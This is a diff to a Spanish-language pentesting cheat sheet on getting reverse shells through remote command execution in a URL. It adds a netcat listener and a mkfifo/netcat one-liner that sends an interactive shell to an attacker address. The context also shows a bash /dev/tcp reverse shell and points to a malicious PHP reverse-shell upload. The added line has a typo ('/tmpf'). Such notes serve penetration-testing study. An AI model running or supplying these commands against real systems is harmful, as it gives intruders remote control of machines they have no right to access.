@@ -15,6 +15,17 @@ Si tenemos ejecución remota de comandos a través de una URL, podemos establece
 "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'"
 ```
 
+### Reverse shell en la URL con mkfifo
+
+URLencodeando esto, y poniendonos a la escucha con netcat, podemos establecer una reverse shell.
+```bash
+#Ponernos a la escucha en la maquina atacante
+nc -nlvp 8888
+
+#Comando a ejecutar en la URL
+rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.3:8888 >/tmp/f
+```
+
 #### File upload PHP
 Si podemos subir ficheros, una opción es subir un php malicioso con el código de la reverse shell, ponernos a la escucha, y visitar el fichero/url
 https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
